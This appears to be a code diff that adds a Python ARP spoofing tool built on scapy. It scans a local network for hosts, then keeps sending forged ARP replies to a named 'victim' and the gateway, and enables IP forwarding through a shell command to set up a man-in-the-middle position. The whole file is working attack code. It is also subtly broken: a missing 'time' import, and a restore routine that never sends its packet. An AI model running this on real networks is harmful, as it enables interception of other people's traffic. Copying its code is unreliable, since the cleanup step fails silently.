@@ -1,0 +1,154 @@
+import scapy.all as scapy
+import argparse
+import ipaddress
+import sys
+import subprocess
+
+
+class Colors:
+
+	@staticmethod
+	def red_color(color):
+		return "\033[2;31;10m" + color
+
+	@staticmethod
+	def purple_color(color):
+		return "\033[1;30;10m" + color
+
+	@staticmethod
+	def bright_blue(color):
+		return "\033[1;34;10m" + color
+
+	@staticmethod
+	def green_color(color):
+		return "\033[1;32;10m" + color
+
+	@staticmethod
+	def white_color(color):
+		return "\033[1;37;10m" + color
+
+
+class Parser:
+	def __init__(self):
+		self.args = argparse.ArgumentParser(description="Program to spoof ARP requets")
+		self.args.add_argument("--target", help="IP address of victim", type=self.check_valid_ip)
+		self.args.add_argument("--gateway", help="Router That you want to spoof", type=self.check_valid_ip)
+		self.args.add_argument("--view", help="View the hosts on your IP. (e.g: '10.0.2.1')", type=self.check_valid_ip)
+
+		self.args_parsed = self.args.parse_args()
+
+	def get_target_ip(self):
+		return self.args_parsed.target
+
+	def get_gateway_ip(self):
+		return self.args_parsed.gateway
+
+	def view_hosts_ip(self):
+		return self.args_parsed.view
+
+	def check_valid_ip(self, ip):
+		if not ipaddress.ip_address(ip):
+			print(Colors.red_color(f"\n[-] Invalid address: {str(ip)}. Exiting"))
+			exit()
+		return ip
+
+
+class ScanHosts(Parser):
+	def __init__(self):
+		super().__init__()
+		self.ip = self.view_hosts_ip()
+		print("[+] Scanning Network\n")
+
+	def scan_network(self):
+		hosts = self.ip + "/24"
+		arp_request = scapy.ARP(pdst=hosts)
+		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+		arp_request_broadcast = broadcast / arp_request
+		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+		for elements in answered_list:
+			my_dict = {"ip": elements[0].psrc, "mac": elements[1].hwsrc}
+			yield my_dict
+
+	def main(self):
+		dash = "-" * 25
+		table = f"IP {dash} MAC\n"
+		count = 0
+		print(Colors.green_color(table))
+
+		try:
+			for letters in self.scan_network():
+				count += 1
+				ip_list = Colors.bright_blue(letters["ip"])
+				mac_list = Colors.white_color(letters["mac"])
+				print(ip_list, "\t", mac_list)
+		except PermissionError:
+			print("\n[-] Invalid permissions. Try with sudo.")
+			exit()
+		print(f"\nTotal amount of hosts: {str(count)}")
+
+
+class Spoofer(Parser):
+	def __init__(self):
+		super().__init__()
+		self.gateway_ip = self.get_gateway_ip()
+		self.target_ip_spoof = self.get_target_ip()
+
+	def get_mac_of_ip(self, ip):
+		hosts = ip + "/24"
+		arp_request = scapy.ARP(pdst=hosts)
+		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+		arp_request_broadcast = broadcast / arp_request
+		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+		return answered_list[0][1].hwsrc
+
+	def spoof(self, target_ip, gateway):
+		target_mac = self.get_mac_of_ip(target_ip)
+		packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway)
+		scapy.send(packet, verbose=False)
+
+	def forward_ip_packets(self):
+		return subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+
+	def main_spoofer(self):
+		sent_packets = 0
+		forward_ip_packets_once = True
+
+		try:
+			while True:
+				self.spoof(self.target_ip_spoof, self.gateway_ip)
+				self.spoof(self.gateway_ip, self.target_ip_spoof)
+				sent_packets += 2
+				print(f"\r[+] Packets sent: {str(sent_packets)}", end="", flush=True)
+				time.sleep(2)
+				if forward_ip_packets_once:
+					self.forward_ip_packets()
+					print("\n[+] IP Packets forwarded")
+					forward_ip_packets_once = False
+		except KeyboardInterrupt:
+			self.restore_tables()
+			exit()
+
+	def restore_tables(self):
+		dest_mac = self.get_mac_of_ip(self.target_ip_spoof)
+		source_mac = self.get_mac_of_ip(self.gateway_ip)
+		packet = scapy.ARP(op=2, pdst=self.target_ip_spoof, hwdst=dest_mac, psrc=self.gateway_ip, hwsrc=source_mac)
+		print("\n[+] Successfully restored ARP tables.")
+
+if __name__ == '__main__':
+	try:
+		arguments = sys.argv[1:]
+
+		if "--view" in arguments:
+			ScanHosts().main()
+		elif "--target" in arguments and "--gateway" in arguments:
+			Spoofer().main_spoofer()
+		else:
+			print(Colors.red_color("\n[-] Type --help or -h for info about usage."))
+	except IndexError:
+		print("\n[-] Invalid arguments")
+		exit()
+	except KeyboardInterrupt:
+		print("\n[-] Exiting")
+		exit()
